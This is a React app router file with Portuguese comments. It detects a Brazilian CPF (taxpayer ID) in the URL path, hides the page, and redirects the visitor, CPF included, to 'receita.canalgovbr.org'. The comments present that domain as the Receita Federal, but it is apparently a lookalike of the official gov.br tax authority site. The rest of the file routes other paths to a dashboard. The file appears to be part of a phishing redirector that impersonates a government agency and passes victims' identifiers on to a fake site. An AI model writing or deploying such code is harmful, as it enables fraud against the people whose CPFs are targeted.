import { Switch, Route, Redirect } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import Dashboard from "@/pages/Dashboard";
import Redirector from "@/pages/Redirector";

function Router() {
  // Verificar se é uma rota com CPF (com ou sem pontuação)
  const currentPath = window.location.pathname.substring(1); // Remove a barra inicial
  
  // Padrão para CPF com ou sem pontuação
  const cpfPattern = /^(\d{3}\.?\d{3}\.?\d{3}-?\d{2}|\d{11})$/;
  
  if (cpfPattern.test(currentPath)) {
    // Remover pontuação para obter apenas números
    const cleanCpf = currentPath.replace(/[.-]/g, '');
    
    // Verificar se tem exatamente 11 dígitos após limpeza
    if (cleanCpf.length === 11 && /^\d{11}$/.test(cleanCpf)) {
      const receitaUrl = `https://receita.canalgovbr.org/${cleanCpf}`;
      
      // Esconder página e redirecionar instantaneamente
      document.body.style.display = 'none';
      document.body.style.opacity = '0';
      document.documentElement.style.backgroundColor = 'transparent';
      
      console.log('CPF detectado:', currentPath, '-> limpo:', cleanCpf);
      console.log('Redirecionando para Receita Federal:', receitaUrl);
      window.location.href = receitaUrl;
      
      return null;
    }
  }
  
  // Para todas as outras rotas, mostrar o dashboard ou página de configuração
  return (
    <Switch>
      <Route path="/" component={Dashboard} />
      <Route path="/dashboard" component={Dashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
